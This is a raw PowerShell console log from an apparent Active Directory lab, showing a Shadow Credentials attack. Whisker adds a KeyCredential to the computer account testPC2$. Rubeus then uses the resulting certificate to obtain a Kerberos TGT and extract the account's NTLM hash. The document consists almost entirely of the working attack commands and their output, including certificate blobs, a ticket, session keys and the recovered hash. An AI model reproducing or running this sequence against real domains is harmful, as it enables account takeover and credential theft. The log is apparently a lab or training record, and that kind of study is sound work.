PS C:\tools> .\Whisker.exe add /target:testPC2
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password lTxOAD0MWMsUE2DU
[*] Searching for the target account
[!] Target user not found

[X] Error executing the domain searcher: Object reference not set to an instance of an object.

PS C:\tools> .\Whisker.exe add /target:testPC2$
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password PUqbdY7r2dqacnwG
[*] Searching for the target account
[*] Target user found: CN=TestPC2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 6cd802e9-d4be-4bd5-8715-bd37a6b05012
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:testPC2$ /certificate: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 /password:"PUqbdY7r2dqacnwG" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfr
eak.lab.lan /getcredentials /show

PS C:\tools> .\Rubeus.exe asktgt /user:testPC2$ /certificate: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 /password:"PUqbdY7r2dqacnwG" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfreak.lab.lan /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=testPC2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mindfreak.lab.lan\testPC2$'
[*] Using domain controller: 10.10.10.90:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/mindfreak.lab.lan
  ServiceRealm             :  MINDFREAK.LAB.LAN
  UserName                 :  testPC2$ (NT_PRINCIPAL)
  UserRealm                :  MINDFREAK.LAB.LAN
  StartTime                :  12/17/2025 9:02:25 AM
  EndTime                  :  12/17/2025 7:02:25 PM
  RenewTill                :  12/24/2025 9:02:25 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  UPey6QpVGhPISE0ePUYsvg==
  ASREP (key)              :  579244F3F5CD2569DB22C68148B06A86

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 65E80B7E43DDD5130C058D206FD2D119

PS C:\tools> 